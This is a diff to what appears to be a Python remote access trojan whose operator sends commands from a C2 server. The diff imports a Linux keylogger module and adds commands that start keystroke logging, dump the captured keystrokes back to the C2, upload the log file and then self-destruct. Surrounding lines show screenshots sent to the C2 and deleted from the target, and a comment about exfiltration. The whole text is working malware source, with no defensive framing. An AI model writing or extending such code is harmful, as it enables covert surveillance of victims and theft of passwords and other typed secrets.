@@ -12,6 +12,8 @@ import json                  # The process of encoding JSON is usually called se
 import PIL.ImageGrab         # python library for taking screenshot
 
 
+from lnx_keylogger import *
+
 # Sending whole data all at once
 def recv_eff():
 
@@ -137,6 +139,30 @@ def shell():
 			upload_file('scrn_sht.png')      # sending the ss to C2
 
 			os.remove('scrn_sht.png')        # removing the ss from trgt
+
+
+
+		# keylogger on
+		elif cmd[:9] == 'keylog_on' and len(cmd) > 1:
+
+			keylog_start()
+			send_eff("[+] Keylogger started!!")
+
+		# keylog dump
+		elif cmd[:11] == 'keylog_dump' and len(cmd) > 1:
+
+			k_dump = key_dump()
+			send_eff("[+] Dumping keystrokes...")
+			send_eff(k_dump)
+
+		# keylogger off and self destruct
+		elif cmd[:10] == 'keylog_off' and len(cmd) > 1:
+
+			send_eff("[+] Keylogger stopped!!")
+
+			upload_file(lnx_path)
+
+			keylog_off_self_destruct()
 
 
 		# Exfiltration in trgt point of view ✓
